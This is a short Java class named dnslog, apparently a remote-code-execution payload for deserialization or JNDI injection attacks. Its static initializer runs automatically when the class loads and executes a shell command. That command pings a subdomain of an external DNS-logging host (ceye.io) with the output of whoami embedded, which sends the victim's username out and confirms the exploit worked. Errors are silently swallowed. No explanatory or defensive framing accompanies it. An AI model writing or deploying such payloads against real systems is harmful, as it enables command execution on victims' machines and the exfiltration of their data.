import java.lang.Runtime;
import java.lang.Process;

public class dnslog{
    static {
        try{
            Runtime rt = Runtime.getRuntime();
            String[] commands = { "/bin/sh", "-c", "ping user.`whoami`.qkpuq2.ceye.io"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        }
        catch (Exception e) {
            // do nothing
        }
    }
}
            